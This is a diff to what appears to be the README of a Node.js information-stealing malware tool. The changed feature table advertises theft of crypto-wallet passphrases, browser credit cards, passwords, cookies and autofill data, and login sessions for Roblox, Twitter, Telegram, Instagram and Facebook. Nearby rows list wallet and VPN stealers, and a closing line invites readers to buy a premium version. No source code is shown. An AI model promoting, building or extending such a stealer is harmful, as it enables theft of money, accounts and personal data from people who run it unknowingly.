@@ -78,6 +78,9 @@ node index.js
 | `You (Close) all processes/Debug Killer`                | Eliminate all processes in one second (All Kill)           | 💜        |
 | `Stealer Wallets App(s) & Wallet Extension(s)`                | Steal all the App(s) crypto wallets & Steal any extension found from a wallet as well as all extensions such as google authenticator          | 💜        |
 | `Stealer OpenVPN/ProtonVPN/NordVPN/VPNPremium`                | VPN Nord/Open/Proton grabber...           | 💜        |
+| `Exodus/Metamask Passphrase & password`                | Stealer Exodus/Metamask Passphrase and Passwords Wallet           | 💜        |
+| `Stealer Session (Roblox/Twitter/Telegram/Instagram/Facebook)`                | Steal the sessions from the aforementioned           | 💜        |
+| `Stealer Credits Cards/Passwords/Cookies/AutoFillData`                |  Steals all possible browsers Firefox/Tor/Edge/Chrome etc, etc...           | 💜        |
 
 - If you want information about the premium version, contact me. 
 
